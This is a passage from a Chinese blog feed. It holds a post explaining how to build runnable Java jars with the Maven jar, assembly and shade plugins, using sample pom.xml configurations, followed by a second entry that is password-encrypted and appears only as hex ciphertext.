        <content type="html"><![CDATA[<h1 id="java-maven打包学习"><a href="#java-maven打包学习" class="headerlink" title="java-maven打包学习"></a>java-maven打包学习</h1><blockquote><p>之前提供spring写了一个shiro扫描key的工具，可惜简单的打包好像不行，因为有依赖包等等，因为我是提供spring框架提供的web服务去扫描的。今天就来填坑。。。。</p></blockquote><p>之前的打包一运行就报错。。非常难受。然后百度了一下原来是因为没有配置META-INF文件，所以在启动jar的时候找不到主类。而META-INF文件里面就配置了jar启动的主类和其他信息(Class-Path)。所以可以理解为启动jar的时候先去META-INF文件里面读配置然后执行java代码。你没有配置当然找不到主类咯。</p><p>然后就是来学习maven打包方式。</p><h3 id="maven命令"><a href="#maven命令" class="headerlink" title="maven命令"></a>maven命令</h3><p>1、mvn compile 编译,将Java 源程序编译成 class 字节码文件。</p><p>2、mvn test 测试，并生成测试报告</p><p>3、mvn clean 将以前编译得到的旧的 class 字节码文件删除</p><p>4、mvn pakage 打包,动态 web工程打 war包，Java工程打 jar 包。</p><p>5、mvn install 将项目生成 jar 包放在仓库中，以便别的模块调用</p><p>6、mvn clean install -Dmaven.test.skip=true  抛弃测试用例打包</p><h3 id="配置一"><a href="#配置一" class="headerlink" title="配置一"></a>配置一</h3><p>使用maven-jar-plugin和maven-dependency-plugin插件打包</p><p>通过<strong>mvn package</strong>指令打包</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">addClasspath</span>&gt;</span>true<span class="tag">&lt;/<span class="name">addClasspath</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">classpathPrefix</span>&gt;</span>lib/<span class="tag">&lt;/<span class="name">classpathPrefix</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>com.xxg.Main<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-dependency-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">id</span>&gt;</span>copy-dependencies<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">goal</span>&gt;</span>copy-dependencies<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>$&#123;project.build.directory&#125;/lib<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>maven-jar-plugin用于生成META-INF/MANIFEST.MF文件的部分内容，</p><p><mainClass>com.xxg.Main</mainClass>指定MANIFEST.MF中的Main-Class，</p><p><addClasspath>true</addClasspath>会在MANIFEST.MF加上Class-Path项并配置依赖包，</p><p><classpathPrefix>lib/</classpathPrefix>指定依赖包所在目录。</p><h3 id="配置二"><a href="#配置二" class="headerlink" title="配置二"></a>配置二</h3><p>使用maven-assembly-plugin插件打包</p><p>通过<strong>mvn package assembly:single</strong>指令打包 </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>com.xxg.Main<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="配置三"><a href="#配置三" class="headerlink" title="配置三"></a>配置三</h3><p>使用maven-shade-plugin插件打包</p><p>通过<strong>mvn package</strong>指令打包</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-shade-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">executions</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">execution</span>&gt;</span>  </span><br><span class="line">                    <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span>  </span><br><span class="line">                    <span class="tag">&lt;<span class="name">goals</span>&gt;</span>  </span><br><span class="line">                        <span class="tag">&lt;<span class="name">goal</span>&gt;</span>shade<span class="tag">&lt;/<span class="name">goal</span>&gt;</span>  </span><br><span class="line">                    <span class="tag">&lt;/<span class="name">goals</span>&gt;</span>  </span><br><span class="line">                    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">                        <span class="tag">&lt;<span class="name">transformers</span>&gt;</span>  </span><br><span class="line">                            <span class="tag">&lt;<span class="name">transformer</span> <span class="attr">implementation</span>=<span class="string">&quot;org.apache.maven.plugins.shade.resource.ManifestResourceTransformer&quot;</span>&gt;</span>  </span><br><span class="line">                                <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>com.xxg.Main<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span>  </span><br><span class="line">                            <span class="tag">&lt;/<span class="name">transformer</span>&gt;</span>  </span><br><span class="line">                        <span class="tag">&lt;/<span class="name">transformers</span>&gt;</span>  </span><br><span class="line">                    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;/<span class="name">execution</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">executions</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span>  </span><br></pre></td></tr></table></figure><p>这里自己喜欢第二个方法，如果记不住可以设置代码块。。</p><p><img src="/2022/05/10/java-maven%E6%89%93%E5%8C%85%E5%AD%A6%E4%B9%A0/image-20210818111820181.png" alt="image-20210818111820181"></p><blockquote><p>参考:</p><p><a href="https://blog.csdn.net/weixin_42248302/article/details/100886727">https://blog.csdn.net/weixin_42248302/article/details/100886727</a></p><p><a href="https://blog.csdn.net/sdrfengmi/article/details/87191944">https://blog.csdn.net/sdrfengmi/article/details/87191944</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java文件系统</title>
      <link href="/2022/03/19/Java%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
      <url>/2022/03/19/Java%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="47eba296a2319413459a3b32a1044f1842bf0ef054baa979c8bb19781c503cae">48e22157b1ef105701eba779d55791b9303847c1b7562fb97ae8cfbc0f205164374f905264eaaf25eead15d79bae6b628c628ccdc145ed64b338bd4df3f1e8ce589425f138aa9b890ed78c7f66a699be1aa9eb2d4645dffc2af46277014acf10b298eabb843d63fc29dc0e9ddb0c0c2e94aa120478c53c779436c7c45a0aed3d477d180a170e7bac4991630e4cf37b2775207d5e6991e13bcb1934ab1699d74abf77e593589a704d466464db22862e1de9738875f520dd31a08f030ea7ad414b5246fbc5bcbb0a2564ec26218dcb924a8dcf13845e810d32cdafdd17a6adcfe16e5dcb511f27cba3bc8d7654817c6c284a6d1b6b37e4aebb6ebe5db25a15ef39377fca0a41e22a50ba9a1e71eecf41771ff33ab8e1dc01ea2c676de89a15a80b0862d33e4a2a80bbadcf1f32953134a7288222817a1f221e37910aed09ee4acb4676a9c557ae560882843313f1f95772660968021506ca968ca6d1c44ee2a43b9774bc21fcee0981cb2185be5bee7ccad29440d6578437a61b7b9d5c8b119849c7dddb16139eb577fde17038edfb9086e19fdace300698c4b77e165a64796754b33718e1c4591cfba4837dcca6280c1e698bcdec0c25a2aa61d896dfd2b76e52be09d2087b46f9d8a4e7ec27dfaac7819edc472ab42e30336698065198d219efb45354c9fdb539716962e39082786d80e67fc87bf16421c1a58c025a21a3ee1079fe7b1ff9ae15080b47479506aeaeecf012e3c9906a7db1c0d3d2ccd299993301c2e63d7c85d637dc7deaf9e71c61233a856c5b686d14a0535ad12e1b83e8eff32333b2873be6740212b1aaec2b62952d2d16feafa779db3a01fc8c955db8790bbe6d307fa0dbf80a3de7cf385aeffa2aeefbf797279c3c52f1d9f1734ede3927463704119d9feeaae26be026013a60f8d470dfdb7988409e43a0c87d38b934c7688e93f02c391c129c27311e8d94abfb1e580eaa77f5808c76a4c18a0cd780c4026b4f230225f5285061ca5da03861df920e6fcf67df70d4d98640fb0ca5d047a06f76f5955bae1668721da6ebe63ce67417e49c5fdc3e2632927d1ccf499bf5630dc3075e90477e89ab16c79a7030956133ccc524c1b84a1255e1405b089dec9f9e33865f879346fbdeaebff68711bb9d58f7fde430f55ff6c6029a0ce092b1663f1e3df041186eb5f6373ab75a73a00d114d7f43d46c6dc4df18c8361d1f46f95d02d5218b5731973d90c372c5496b1725269fc7c36e4e89e2aecec5c11d675ccedd6e62d7e3bfa5a1e168235b0aebbd815409e752552accca2e218ff81e9818ec77aa808b9a0de0f8ec9815dcf954bc183e3bf6040b5630501234a080b9a33740ed84299cadaa624bcc4b314eb49c42a647a357c624492a5f763c7500f0c353866324d8ccfb865ebd490d352e50cb08f0ac75da725563d49cb4a237be1c185a62f239f457f33a1631ffcce6a939185f1f9dd1dff25d028a2d1741a2b245329fbbf582fec157760c2354efedb7bf303a261fbf070bbbeeb6bc6bf3ff5943547d50755c810cec89dd004d1af54a92f53698fc22de72113235ca43c99c040cdd0e2a4c5a227457a43bd3c774a2ed77aaaa7dc5ef926c4edf274c6e47f7c611710492613ed3bbceb649334c0474c3140e6469e260cea03be6704e00110aedf5f479188ca89c37a1694de17779f5370dd6469a259d99f7de3d7fb98d6f5ead529868a82f6ee588e4d00da7c22830b62dcd3a05fb04162daa538180c6434a1fdfb9de766365b870114549c06f3a9cb836180db4e5ab68ccedc6c25060d75e0ddd82d8f1233c9df45602209a8afbfc82e69088d75c58306515d8557c1f42fe0bb0f2b285c20721aaa7c4934bd33d527c00a63c450076648183233bddb03b29029909618a8a9bfdc43b99b29cea9acacfdf9e0df714e4bfef5c0246a96ce3438a67a9185ca2d9a2f3b20391d776ceb53c58b132b6be3c546256bb3452e74d4da70c2dae550bea2c31a81dd0b61dc40aebd11f8926e53f6873ba445a9534c4df80e68aeca7669ad1c3abc38530a2a83f1a45d390b3c7e26fa640e12ad5a84647a8cd48037a9c76aff4bb69d1c64236e72ee14f96f230c09369dc61c4662edca5dcb685c670424c5037465d979c094c82fcbb07a1d2c7360c1ab149656b849ab42e2e5763787db69166dfd130bf347abe16fe01f3c776aebc254bca45c58c44cb12b5414b25d725aa0913aafd64d5b130be322d7621e00ace54f3216e7738a03f08579adc692e74498587dda2fb700257acc885080d3085063a4e6b50b3bc32f43ba2bc998ae5c5d2743b7ef85ceabd096190b495628012806890185f0bb451ebea5b9b5f70ab9656d32868e2e8f6c677395e0853a7146b8eae93b68c0190fd17cbebbd022581a36608d108d7321b654f0141259e4538a029ea63c17fe186360c2f2f920cfb36d7041b39f4090fc8a9d362bfd918116fc1c5d2ee0419b74d5246619f3881360bcdd55c9f2af973c8693703ec2bbc45824914ad8bac9ad0b54a71e081278e3ae5c4c9076eeb928409e4c26ec624f3b3e287a3a31632c1b93fdbffbd41e0f6dac54f9c45880ad692e5b631dcfc2901d03b6f4be3252404c65a4c9858544c667f04e11d7f8eae8a7bade90ba0153597c671295893498ad9a9a7aea4e512256e52d653d92e8b9c50b159e3cce158dc3e9b581ec97aa195725abb527ccee8dc0ba1f27048bbf0b6a6b7cee5a80031d37d2c4151f216e00b5b6ddb27e95106394e0fef8a3aaf9c85e2b1e40dbedbc70f0daa4a754110aa5756ee191e117d70d8b9cdf880bcca014fd99d0da0afdc0dd39afa9046d44d7494a72d0ed6c5e1ab76d108833a9f01d842e0fd5bafa7682fd7290e37b9c50cf5a8411d9b15b05a5602f039b69f85dbe3f83d597278e94d57b8d35330b45278cc569101937aeb2ca0e2864d2cd5b5aa4afd463ceed201630a1e137041e1c92b584680d2c85b190077f7e47c7959ed2cabc0bb2ff82492c743faa43ee54ae5883a33a499bee147d7de72d4c3676867fbb272a50a4df5779542fd3db7a1759ac6c21f4c358ab3ba4fbdc88fcc46e104c303db21c4e8a0b89d7b5fe8c3e0037977cd6d35c05e70fd56352b80cf6e2d1374aa0656b8b0b9c14ae1147f425458d5956e9cb7817270dd1ff2ead80b8f40c59e1b133cd8a27afdff1bec18942d7fde63a89f435af78d98bee5224e3b42b4d0dd3f1e6e4274e7280ac0b3975d63ea486453b366fc8a528872d16a545f2918b03d3c3bfb8d4d80ef3a66c939ca45294de5130ca4c0f1db17299f2219162963d48db436926dad81cd32ca50447f7a41cd561a1e2b67da2cf72bc6a98d9366529d8e1c91aced0597f661e6c41749854eb012d7fafd5dcc012511d6ecc0eb5f1ec2cfc5f3cd8010b7acfb6bbb6f6641e4e1266c29540f354f6f9f08c640d1770eaeb0a168d12a3cf9b782cf2ec13339a489ce052d8d358e05df606c3577c3398f952663264a6ac14342e0c05d0efbe1a19aa790cdde5aef1c5f12e38c46ade1fd7cce36973a4c0ae6ee4d77b5c18d41ae4bbded5c853d3febfdfb603b5b83b6d65e58e67d3e3a15a4d4ec4907fc53acb3a52ae6df9841f419b6c991246f0842ff35fe9b684cbb9938d1ed32285110eb253f3f54f107dab55c9e26f0eead065e214655957d2dcee6a5a2f2b6ee2a313ce4cd245c8549a25f932c71471210ecba5b5d2ac278fab145fb9f3b054da5590646c796b8fd4674c4c3e8444c18af6872cb63b881c2ac5928e111b08b0c4a9bfaa597659a23da0a65307d0aa12405715e5390157bc7465850dc14d1af24e7e33d41dd11be8053458bbf6e3abb87ad9b07d19beee1d54e83429911bc031d772897f2d37f1eddbb8d46e9d56ebea1b1f57a9864aecf4a658e2b9c9408298d432d0460cc97b86dfa23478d64e7cb6632ac02aca7a895b109740376d37a739792db1dea6b5fb631c55f2af5b33b7ee59a8910aee738d803d47f52f422e91cc6b0a2f2172631b756417c449b7b2ff65b3a033a75ac36c0a2067d1eca93a8c27f216146dceeaa637b486bee038275e6c34a028a4196f68148cee53fb9f785128b240b804eb4a2777cc05f4a41506fc82f88fa35572b2a1d40d4acbb94a2f162490754e6b168cde7385f237d864f57751f9e2525cc2d637dd6af95419d239a74a19aa7dac0d265f5ea2871f381ed6c29baf1c1e3530d31bb5f38e2f9915e38421bffd6f2cd549ad48b669b901a214ec7852727ba58b859f6f8da92c4361d44a445fe7d0832b5e32d7b8db3f74582e9ad7add19ce5a5873004bc6e655e0ac3207c9659a57b0b99cdab4a8bfdccdafd7cc68dbb41fecfecb764470d663f99021954bdb2a5ad9a161b071b76743a4a5042bbfa049dcfa2e32988110ea2a1401f0f31a79d14b793131353b470cc0a9dad8cc223764cd1830819f482af8ea578e0b69383643a3b807ecf97766401eb7921cedf57bb5ba3966dd6abebdf36609af7888cc5f1e61309517c81e4ce4fd89aa2f48a3f35752106165d589567e2b6dd9725d329787c1bfd38a967477e6b357840c46be86df6e6832c64fa77e658e2d4023a994e6a606bf52a4985f1b2a55fd6415281971ae5dc5ece49aa3c3882c14c01522515b778c23ab5ffe3ea96f6c19450a624ce4cd2f9c518b25fce03d2cf186dba799ef41d72b74cebb91129d055e3a91e8bf08070a99a6a97e415333e6d34c27f20cd36a79d3db635f6c1d7b751c63c5218e5494eb9ff70cf70f14d7d222a6877c73674478979eaa1db9b4c63cb1cb16593689e9beaa4723374dafc52d5d9183de6a2f5735a66a3f0aeceaaa68abf8caf89431438857e809d5c5fc033a3de8bef332b2ab6809bc2824ef6ffc97e581e318839f5e7f47e4701f6e364d668b3ceadcff7e1fdd957229deca88105a7d8cb7057b70dc55bedb8b44259488fcf0e5cab25f8c2b216b3ea28ca35081eb2e52b10feb52f4444d9eed4f0ea3a68fcde27d5742fbbb844db65bcbb627887f69c855a553c94395e6701e9db1a43791ebd40936bdd3389863ba233c50d7b82b858e383166328e36d5ac991756f38203dd1d3d1552db4c7b971e3a3de581d804b3d49a7db76601ac288581dff6185079c95f3be26428b964d292e1c6de46b29234dae4a59cfd3bbd977574bc8f65ab6e1c5dd0a605b5b2d81a08702e21d89be8379ab8d49b86adeaf5770db4718974a23ede8cd1a5e179bd3f46588ba13ca79e5810fbcc494daf4913083bab66115c3d87b17975415123cb5e28d9fcf27f1985df93387780e01a8b35dc5f066c8f9d4b4b2aba14f3cf31ff6a7d7587753c12457e3753ad3928461575c7865b2324dbf17c7724a25e262930df5464c10b09639a3d069380306a8f50b08c459bcf3bed29cbf7b83db9a2f0fabede2039737a7315da843d53a8cc09a0fb222bcae9086b30f7f7707676841a34a2eeb629871a5faa73d3d9b53125be1ec1028500689207158c5ed2ae55edc6f48180f54a24964af460719ac0e2775481c34d34953515d8829a2575ecb39773832d4c2cddffd1ae939dc25525ac727ea8ec531be30fa159c00c82f31817bff0aa7d3e1c62db1300cda73e62279c199736e690e8b6314bc654e8768a216f52c0320eb24bd6b8d03be74a9ad06da24f06fac666cb3f7597028c07ffe1c0170377917f16f0b36de63019b987097364b1cf7e300c898f4155663f921c95e678efc8d4c3939ae58e8bc06e28f66830299c1cb5c961bc182061a98fed884a0e0e9e18c35788be31167edef0e89c05ee21ccd4be2c935a373111175e3336c88fcb3074482b1c25980e9060b3016d957a502bc0ddc241c015efe6d4581ef8d623798d36b0d8d5df89ad8eb7165fb012d7484cfb4fa3dde3adce6d88e92de7c921f735417e34c49d2e7a9e9b390480fbc0db6450a116aa18a8f997c5b92d8c21002e9f8ba8c205517c8863584d55092d8dd37c9ce3944436736021af38bda61284b7c2f13b34ff0ed73220cdb92139548a0324efa112c4b5c5ea3d5a1fed4368c93585c6d6407036d5965c39d41226432d06e24397c9ff5e363aef716982d59a29b781d3c5569e49115933b8b59eee7c3ab9d21a5db1d85a16f5dd9110e4701e4c440578f04f7d1daf270239458089253428be534b13ae6c53b187971fc081ee737ba758bb2744e87629e68510ea28670ed8285ff4805fb59f7254c7f5bcbbd091852087e61d3dabb0131af3b69ff96cea99028a506862ed5c8d0a8469e57ec05b80f5bed15fb879b0745c07e5f283ce35e3a6d8b6ac62e704bcc4e3a3dc0e30a5488f8d407e80ead1a173d019785a55c7cd483094f8cc18ccedf3cdd19757154404c7bfa4feab847cf2214fb0e7ba761d2c5aaba94db7bda26e5d886e368029b5c886a7ca104783065cdfadea25c2cc87a3b0d80b1827ce151c8041176f39bb28cb2c5022fc13c4197e71ca13bbdee94e2bc5f52e89608e59d1e8775ebef87886ca00607c43be1afd0cc2bb358d44016988d98de61df1bd0a56fd0384454ba0813112d92f26d4341183a8decc1ae9a0d0cdd179be63225cbf8cd22590d9021b28f6082abc080d19a3ab1ba87ef7170bbb53b1f0fb25ec3fa10c61c079ddcef36cab5cf7b08d50a69f0490150037c5a704187874d9bf34c98ae879f56f22fdd4286127553f448ab60e8de9c01de06ee251c840d7124d2b8f97ea317090a427701a91daff7c84eec760242ca1315ab874b0db0242206fc1817fc4d09b2e5da62a8e9ec720213fc3b36a535818256f8409bb0e8007b21660a629f1679bc2b5ea6999a0e2626dfd7e21220a6fd71045b93e42286af8f93c6656eb5b2de02f181420537ea7d679cbf4a04773facbf19070c77207c919dc04dc97de1c5961a65fe17a6abaf8ab55c2356747869c36c18305e1166081353b2a9f34c418f621483f4a65817d445d671c2785191daca1d4f318e669ad3a9233a78ee4d5b9e3f36f5a9839f2f5f6bf433b9220c54bad11c0b99d9c0e07b0b3d83ebc411df9129fb6268a770a3f15b8a425ba5d1c73bd1dcbfbaa8a2972fc04f7af438f939cffbf2f1b25bc15b07c7e21c5d34d8bcbda41ff26678aebf45b2fa9d528eb7ce6f4de30543b68abd28a0927a322273acb0d92795068ba8a479d1683f093969985d7f18bf3227ae10b0f87f5d008bcb507f9de15d16f8f3d9474adb79f9d1b3770ea47e5a5896d247dac09304cce394317212c1d7b6a2ff099fa60fe024fcdd607239fec37ea732d4675687c80a3cdaa030f202450e69c802f605c791b796170615665747c961a7b2eb79af9725552cdf8a4f48804c0c13daa747877b59a698a49151a81276ac660bc3cc69b5d8531dcf584838df5e30c3d475c9247b1206d271379c7d6a746b45dd7620d2756690420d67750894e0b8f029a331b5e2cdba6109f078728d8c26a79d756276b8d5c1c7820db2e49eefb63c68a11fde81824dee28fb80f78bcc7d7a4d7a24ba3475ffc39b627ccb0c833c8340aa414ff647d00be7481768217b68d9e73b2f3a160dad59cd1b5fc30cf9bd054249df985a7b9bedc91d674aaddc93062c57deac251d5a98797602549c0df03eb7b82c8268e6f10274fb76464a621c0ec0b808773a9f60c30a3a3cadd02bffeb2b17c979113d074cb7d6e7926bf91d9f4887c578fae213102e7697a9425054dc7d3051eeb5f9434916db958738c971cf0765e765738a7a6c7bcc75a19fe0423ae09b23121b1a9a2664282943e8a6e0a51d7d6a92a51b92ed92bcabf4b8bee7a5e7171b1d4bb9def25713218c793a539dfa215c3b19a95baaabbcb9802ea2a148f76c1cd42494e3aea10e4dc397b673517a8485c4eaca0bae23ea56efe4edba37e80a6c511d083aa84b29c47cf4dd146ab9285fff38023cb3d11e1aadedfb51896bd707f9594dc377c05ed8bf5082ab585cd95e19f8a230538dfc9003ed1839fafb1444b200787371f3a5369bb0fa1cb15632dedaeba3f0638cc3c7802455db15fc648d8b73fa31a5d0a413d5d4631fe710e63e58eb75346fa83a09828e30446e50f22cd19e102d5049a022215e72a0bd7a4e07031ae89ad52c73ce73973e9a7c929248874a1d97897832e85f90eb4aa0d7b3bd124f6f25f8693685b62d9d98b131f1e9bd012db6c2cd5e9e937d85572c49c7c7e34cc3c5729b4e27ac89c9dfc6470e87ee3e60c1c4239affcd806107821d5157119cb58653365a73bac253d76b2dc64ea25fe49a663695c1441a26985b279cfab91d152f12c5b36d5253600215537d6b55ea6af849b6677d39b3c4830f6caee2ac164890733eed53431852693be2f4a30a332112e21439e120a5c61acd9183abece357957576d0426ac4b1dd0b36c8eeef0f3fec923e98d8fa633d7ca111cb4d3fd5b82c923076a64366568cc4af73e509b961ed15d469e3d902be280656e620167e8430e867d3c454383deb5c16a7f76d70fec246f6d115030b5573171430147396cebe2ac1d84d67b49d89aa84c273501b5de357fc728928ae7d31ccaeebf96c43f0125bb2bb61d1ed0d1961601ee3404f357a01b03e7ce63ac052aefe42575e03e26912850ca078eb9f0c670bd4fb9c854ada1eb19800a4c43c66bbc3bba668625e3df48fe44f61a20d7316757870e3854050ae23b038e83d04e850e63b2412663b78bf0d91858390be14bf0bce7e978d8077877d065ff182f26bf44905745668ed007d9b6552a3e3dc6c2b1329e7aedf46106242c2d3ae7813e80b066a073c19e086ef6f627aa1d64de5b8d90d0b85d1973b0c8ff435a3f3293e8d7b128a05fc93a8c7c5e09eeeed666d7aa6360a1dafd350411cf76809fa0fc8daff6fc1ded2c4c18f9ab9debc6c804c18b388f42205e61f6c355fe96b0f0c9227bad022d29d1c8